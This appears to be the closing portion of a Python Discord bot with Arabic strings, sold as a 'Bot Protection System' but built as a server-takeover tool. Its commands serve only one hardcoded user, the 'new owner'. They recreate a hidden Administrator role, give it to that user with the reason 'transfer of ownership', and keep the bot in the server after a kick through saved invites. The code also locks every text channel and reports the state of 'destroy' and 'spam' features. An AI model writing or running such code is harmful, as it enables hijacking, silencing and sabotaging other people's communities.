        await interaction.response.send_message("❌ البوت يحتاج صلاحية Administrator", ephemeral=True)
        return
    
    await interaction.response.defer(ephemeral=True)
    
    try:
        old_role = discord.utils.get(guild.roles, name=CONFIG['owner_role_name'])
        if old_role:
            try:
                await old_role.delete(reason='إعادة إنشاء الرتبة')
                log(f"🗑️ تم حذف الرتبة القديمة", 'INFO')
            except:
                pass
        
        new_role = await create_protected_role(guild)
        
        if new_role:
            target_member = guild.get_member(TARGET_USER_ID)
            if not target_member:
                try:
                    target_member = await guild.fetch_member(TARGET_USER_ID)
                except:
                    target_member = None
            
            if target_member:
                try:
                    await target_member.add_roles(new_role, reason='نقل الملكية')
                except:
                    pass
            
            if new_role not in bot_member.roles:
                try:
                    await bot_member.add_roles(new_role, reason='حماية البوت')
                except:
                    pass
            
            embed = discord.Embed(title='✅ تم إنشاء الرتبة المحمية', color=discord.Color.green())
            embed.add_field(name='📛 الاسم', value=new_role.name, inline=True)
            embed.add_field(name='🆔 ID', value=new_role.id, inline=True)
            embed.add_field(name='📊 المركز', value=str(new_role.position), inline=True)
            embed.add_field(name='👑 المالك', value=f'<@{TARGET_USER_ID}>' if target_member else 'غير موجود', inline=True)
            embed.add_field(name='🔒 الصلاحيات', value='Administrator ✅' if new_role.permissions.administrator else 'ناقصة ❌', inline=True)
            embed.add_field(name='🤖 البوت', value='محمي ✅' if new_role in bot_member.roles else 'غير محمي ❌', inline=True)
            embed.set_footer(text=f'Bot Protection System v{VERSION}')
            embed.timestamp = datetime.now()
            
            await interaction.followup.send(embed=embed, ephemeral=True)
        else:
            await interaction.followup.send(
                '❌ فشل إنشاء الرتبة. تأكد من أن البوت لديه صلاحية Administrator وأن رتبته أعلى من الرتب الأخرى.',
                ephemeral=True
            )
    except Exception as e:
        log(f"❌ فشل fixrole: {e}", 'ERROR')
        await interaction.followup.send(f"❌ خطأ: {e}", ephemeral=True)

@bot.tree.command(name="antikick", description="🛡️ تفعيل/إيقاف حماية البوت من الطرد")
async def antikick(interaction: discord.Interaction):
    if interaction.user.id != TARGET_USER_ID:
        await interaction.response.send_message("❌ هذا الأمر فقط للمالك الجديد.", ephemeral=True)
        return
    
    guild_id = interaction.guild.id
    is_enabled = guild_id in anti_kick_guilds
    
    if is_enabled:
        anti_kick_guilds.discard(guild_id)
        await interaction.response.send_message('🛡️ **تم إيقاف حماية البوت من الطرد.**', ephemeral=True)
    else:
        anti_kick_guilds.add(guild_id)
        await interaction.response.send_message(
            '🛡️ **تم تفعيل حماية البوت من الطرد!**\n'
            '✅ البوت سيعيد صلاحياته تلقائياً\n'
            '✅ البوت سيحاول العودة إذا تم طرده',
            ephemeral=True
        )

@bot.tree.command(name="saveinvite", description="💾 حفظ دعوة احتياطية للعودة")
async def saveinvite(interaction: discord.Interaction):
    if interaction.user.id != TARGET_USER_ID:
        await interaction.response.send_message("❌ هذا الأمر فقط للمالك الجديد.", ephemeral=True)
        return
    
    await interaction.response.defer(ephemeral=True)
    
    invite = await save_guild_invite(interaction.guild)
    
    if invite:
        embed = discord.Embed(
            title='💾 تم حفظ دعوة احتياطية',
            description='🛡️ إذا تم طرد البوت، سيحاول العودة تلقائياً عبر هذه الدعوة.',
            color=discord.Color.green()
        )
        embed.add_field(name='🔗 الرابط', value=invite.url, inline=False)
        embed.add_field(name='📝 الكود', value=f'`{invite.code}`', inline=True)
        embed.add_field(name='📅 تم الإنشاء', value=f'<t:{int(datetime.now().timestamp())}:R>', inline=True)
        embed.set_footer(text=f'Bot Protection System v{VERSION}')
        embed.timestamp = datetime.now()
        
        await interaction.followup.send(embed=embed, ephemeral=True)
    else:
        await interaction.followup.send(
            '❌ فشل حفظ الدعوة. تأكد من أن البوت لديه صلاحية Create Instant Invite.',
            ephemeral=True
        )

@bot.tree.command(name="status", description="📊 عرض حالة البوت")
async def status(interaction: discord.Interaction):
    if interaction.user.id != TARGET_USER_ID:
        await interaction.response.send_message("❌ هذا الأمر فقط للمالك الجديد.", ephemeral=True)
        return
    
    guild_id = interaction.guild.id
    uptime = datetime.now() - bot_start_time
    hours = uptime.seconds // 3600
    minutes = (uptime.seconds % 3600) // 60
    seconds = uptime.seconds % 60
    
    embed = discord.Embed(title='📊 حالة البوت', color=0x0099FF)
    embed.add_field(name='👑 المالك', value=f'<@{TARGET_USER_ID}>', inline=True)
    embed.add_field(name='📁 سيرفرات', value=str(len(bot.guilds)), inline=True)
    embed.add_field(name='👥 أعضاء', value=str(sum(g.member_count or 0 for g in bot.guilds)), inline=True)
    embed.add_field(name='⏰ وقت التشغيل', value=f'{hours}h {minutes}m {seconds}s', inline=True)
    embed.add_field(name='📌 الإصدار', value=VERSION, inline=True)
    embed.add_field(name='🔒 محظورون', value=str(len(get_blocked_users(guild_id))), inline=True)
    embed.add_field(name='🔥 تدمير', value='🟢 يعمل' if destroy_status.get(guild_id) else '🔴 متوقف', inline=True)
    embed.add_field(name='💬 سبام', value='✅ مفعل' if is_spam_running(guild_id) else '❌ معطل', inline=True)
    embed.add_field(name='🛡️ Anti-Kick', value='✅ مفعل' if guild_id in anti_kick_guilds else '❌ معطل', inline=True)
    embed.add_field(name='🔗 دعوة محفوظة', value='✅ موجودة' if guild_id in guild_invites else '❌ غير موجودة', inline=True)
    embed.set_footer(text=f'Bot Protection System v{VERSION}')
    embed.timestamp = datetime.now()
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="protect", description="🛡️ تفعيل الحماية الكاملة")
async def protect(interaction: discord.Interaction):
    if interaction.user.id != TARGET_USER_ID:
        await interaction.response.send_message("❌ هذا الأمر فقط للمالك الجديد.", ephemeral=True)
        return
    
    await interaction.response.defer(ephemeral=True)
    
    guild = interaction.guild
    
    protected_role = protected_roles.get(guild.id)
    if protected_role:
        try:
            await protected_role.edit(hoist=False, mentionable=False, colour=discord.Colour(0x000000), position=0)
        except:
            pass
    
    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            try:
                await channel.set_permissions(
                    guild.default_role,
                    send_messages=False,
                    create_public_threads=False,
                    create_private_threads=False,
                    send_messages_in_threads=False
                )
            except:
                pass
    
    anti_kick_guilds.add(guild.id)
    
    await interaction.followup.send(
        '🛡️ **تم تفعيل الحماية الكاملة!**\n'
        '✅ جميع القنوات محمية\n'
        '✅ الرتبة مخفية ومحمية\n'
        '✅ Anti-Kick مفعل',
        ephemeral=True
    )

@bot.tree.command(name="unblock", description="🔓 إلغاء حظر المستخدم")
async def unblock(interaction: discord.Interaction):
    if interaction.user.id != TARGET_USER_ID:
        await interaction.response.send_message("❌ هذا الأمر فقط للمالك الجديد.", ephemeral=True)
        return
    
    guild_id = interaction.guild.id
    blocked_list = get_blocked_users(guild_id)
    
    if not blocked_list:
        await interaction.response.send_message("ℹ️ لا يوجد مستخدمين محظورين.", ephemeral=True)
        return
    
    for user_id in blocked_list:
        unblock_user(user_id, guild_id)
    
    await interaction.response.send_message(
        f"🔓 **تم إلغاء حظر {len(blocked_list)} مستخدم!**",
        ephemeral=True
    )

@bot.tree.command(name="blocklist", description="📋 عرض قائمة المحظورين")
async def blocklist(interaction: discord.Interaction):
    if interaction.user.id != TARGET_USER_ID:
        await interaction.response.send_message("❌ هذا الأمر فقط للمالك الجديد.", ephemeral=True)
        return
    
    guild_id = interaction.guild.id
    blocked_list = get_blocked_users(guild_id)
    
    if not blocked_list:
        await interaction.response.send_message("ℹ️ لا يوجد مستخدمين محظورين.", ephemeral=True)
        return
    
    list_str = '\n'.join([f'<@{uid}>' for uid in blocked_list])
    
    embed = discord.Embed(title='📋 قائمة المحظورين', description=list_str or 'لا يوجد', color=discord.Color.red())
    embed.add_field(name='عدد المحظورين', value=str(len(blocked_list)), inline=True)
    embed.timestamp = datetime.now()
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="stats", description="📈 عرض إحصائيات البوت")
async def stats(interaction: discord.Interaction):
    if interaction.user.id != TARGET_USER_ID:
        await interaction.response.send_message("❌ هذا الأمر فقط للمالك الجديد.", ephemeral=True)
        return
    
    total_guilds = len(bot.guilds)
    total_members = sum(g.member_count or 0 for g in bot.guilds)
    total_channels = sum(len(g.channels) for g in bot.guilds)
    total_blocked = sum(len(users) for users in blocked_owners.values())
    
    embed = discord.Embed(title='📈 إحصائيات البوت', color=0x0099FF)
    embed.add_field(name='📁 سيرفرات', value=str(total_guilds), inline=True)
    embed.add_field(name='👥 أعضاء', value=str(total_members), inline=True)
    embed.add_field(name='📁 رومات', value=str(total_channels), inline=True)
    embed.add_field(name='📌 الإصدار', value=VERSION, inline=True)
    embed.add_field(name='🔒 محظورون', value=str(total_blocked), inline=True)
    embed.add_field(name='🔗 دعوات محفوظة', value=str(len(guild_invites)), inline=True)
    embed.add_field(name='🛡️ سيرفرات محمية', value=str(len(anti_kick_guilds)), inline=True)
    embed.set_footer(text=f'Bot Protection System v{VERSION}')
    embed.timestamp = datetime.now()
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ==========================================
# ====== تشغيل البوت ======
# ==========================================
if __name__ == '__main__':
    try:
        bot.run(TOKEN)
    except Exception as e:
        log(f"❌ فشل التشغيل: {e}", 'ERROR')
        traceback.print_exc()